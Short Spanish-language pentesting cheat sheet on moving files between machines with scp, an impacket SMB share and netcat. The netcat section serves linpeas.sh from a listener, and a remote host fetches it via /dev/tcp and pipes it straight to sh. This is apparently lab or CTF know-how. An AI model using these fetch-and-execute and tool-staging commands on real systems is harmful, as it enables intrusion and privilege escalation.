https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb

# SCP
Desde máquina remot a local
```
scp -r nico@192.168.1.81:/nico/homer.jpg homer.jpg
```

# SMB
Crear servidor smb
```
smbserver.py <nombre del directorio> <lugar del directorio>
---
smbserver.py lepra .
```

# NC
Máquina local
```
sudo nc -q 5 -lvnp 8888 < linpeas.sh
```
Máquina remota
```
cat < /dev/tcp/192.168.0.5/8888 | sh
```